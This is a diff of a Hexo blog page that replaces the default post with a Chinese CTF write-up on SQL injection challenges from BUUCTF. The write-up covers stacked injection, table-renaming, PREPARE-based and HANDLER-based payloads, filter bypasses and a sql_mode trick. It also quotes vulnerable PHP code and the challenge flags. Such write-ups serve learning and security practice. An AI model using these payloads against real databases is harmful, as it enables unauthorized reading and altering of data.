@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, web security">
+    <meta name="keywords" content="buu 注入类汇总, web security">
     <meta name="description" content="技术安身立命，思想改变世界">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | K1@ing</title>
+    <title>buu 注入类汇总 | K1@ing</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -315,7 +315,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">buu 注入类汇总</h1>
                 </div>
             </div>
         </div>
@@ -429,12 +429,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
+                                sql注入
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -443,28 +456,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-10
+                    2021-01-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-12-10
+                    2021-01-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    75
+                    992
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -484,19 +497,74 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                <h1 id="注入类"><a href="#注入类" class="headerlink" title="注入类"></a>注入类</h1><p>sql注入一直是web安全老生常谈的问题，同时也是常年占据web漏洞榜单的前列，虽然近几年ctf对sql注入的考察日益灵活，但是基本点还是得好好搞一搞。</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入的基本原理是在sql中， <strong>；</strong>一直被用来代表sql语句执行的结束，而如果后端代码允许在；后插入新的多条sql语句，使这些sql一起执行，就构成了堆叠注入。</p>
+<p>需要注意的是，堆叠注入与union联合查询并不相同，union后面接的只能是select语句，即只能进行查询功能，而堆叠则可以执行任意sql语句。</p>
+<h3 id="buu-web-2-随便注-强网杯2019"><a href="#buu-web-2-随便注-强网杯2019" class="headerlink" title="buu web 2 随便注 [强网杯2019]"></a>buu web 2 随便注 [强网杯2019]</h3><p>flag{72889698-fd20-41d7-a081-e7321af36e19}</p>
+<p>核心源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;multi_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//multi函数可以执行多条，造成了堆叠注入</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];<span class="comment">//查询语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>拿到题目之后感觉是sql，首先进行闭合，发现找不到注入点。尝试一下堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>发现有回显，此时查看每个数据库的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> everydatabase;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在supersqli数据库中发现两个表</p>
+<p>1919810931114514</p>
+<p>words</p>
+<p>看一下字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>在一串数字的表里发现了flag字段，尝试看一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>注意数字名加反引号，果然，发现了关键词过滤</p>
+<p>观察一下，输入框内输入一个数据，回显另一个，也就是说被用来回显的表应该是两个字段，而我们观察一下words表，恰好两个字段，会不会就是使用的words表呢?</p>
+<p>如果是这样的话，猜测后端的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> XXXX <span class="keyword">from</span> words <span class="keyword">where</span> <span class="keyword">id</span>=$_GET[inject];</span><br></pre></td></tr></table></figure>
+
+<p>比较巧的一种方法是重命名，即将words改为其他名并将数字表改名为words，将flag字段改名为id直接在输入框提交即可</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>此时在输入框输入 1’ or 1=1 # 得到flag值</p>
+<h4 id="进阶方法"><a href="#进阶方法" class="headerlink" title="进阶方法"></a>进阶方法</h4><p>看了dl们的解法有两种比较新颖，</p>
+<p>1.预处理</p>
+<p>预处理原理：对于每条sql语句进行反复调用时，若反复进行编译效率太低，因此推行了预处理，即先将sql语句中的值用占位符处理，相当于将sql语句模板化</p>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">Set</span> @a = <span class="keyword">CONCAT</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>);</span><br><span class="line"><span class="keyword">prepare</span> m <span class="keyword">from</span> @a;//定义预处理语句</span><br><span class="line"><span class="keyword">Execute</span> m;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>2.handler</p>
+<p>handler是一种mysq自带的，非标准的sql语法。性能高但是少见</p>
+<p>基本语法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> table_name <span class="keyword">open</span>//打开一张表</span><br><span class="line"><span class="keyword">handler</span> table_name <span class="keyword">read</span> <span class="keyword">first</span>(<span class="keyword">next</span>)//阅读指定的行</span><br><span class="line"><span class="keyword">handler</span> <span class="keyword">close</span>//关闭</span><br></pre></td></tr></table></figure>
+
+<p>因为flag就在第一行，所以payload比较简单</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> u;</span><br><span class="line"><span class="keyword">handler</span> u <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> u <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="buu-web-5-easysql-suctf-2019"><a href="#buu-web-5-easysql-suctf-2019" class="headerlink" title="buu web 5 easysql [suctf 2019]"></a>buu web 5 easysql [suctf 2019]</h3><p>flag{230b58e2-6c67-4bad-98b0-5e84cccfa11c}</p>
+<h4 id="一般思路-1"><a href="#一般思路-1" class="headerlink" title="一般思路"></a>一般思路</h4><p>本题第一次见十分让我费解，因为输入各种payload只有1有回显1，其他均无一头雾水。</p>
+<p>后来才知道这种情况下，基本上是&amp;&amp;或者||，即逻辑与和逻辑或，比如本题，即为或操作，猜测其sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+
+<p>flag是一个字符串，||操作很难使得其为真并回显，所以测试常规payload只有1有回显1，因为只有此时查询内容为真。</p>
+<p>思路主要是处理||符号，即将其转化。</p>
+<p>使用sql_mode，该函数定义了mysql支持的sql语法，其中PIPES_AS_CONCAT会将||视为字符串连接符。</p>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="进阶方法-1"><a href="#进阶方法-1" class="headerlink" title="进阶方法"></a>进阶方法</h4><p>思路同样是处理||，但是dl们搞出来一个非预期解</p>
+<p>*,1</p>
+<p>此时的sql语句拼接为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+
+<p>1||flag恒为1，sql语句相当于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span> <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+
+<p>因此会查出表中所有内容，自然就查到了flag</p>
 
                 
             </div>
@@ -523,7 +591,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://K1ingzzz.github.io/2020/12/10/hello-world/">http://K1ingzzz.github.io/2020/12/10/hello-world/</a>
+                    <a href="http://K1ingzzz.github.io/2021/01/20/buu-%E6%B3%A8%E5%85%A5%E7%B1%BB%E8%AE%B0%E5%BD%95/">http://K1ingzzz.github.io/2021/01/20/buu-%E6%B3%A8%E5%85%A5%E7%B1%BB%E8%AE%B0%E5%BD%95/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -560,7 +628,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -602,9 +674,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/20/buu-%E6%B3%A8%E5%85%A5%E7%B1%BB%E8%AE%B0%E5%BD%95/">
                     <div class="card-image">
@@ -622,9 +695,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -637,6 +710,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -652,7 +726,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2020/12/10/hello-world/">
@@ -682,7 +756,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
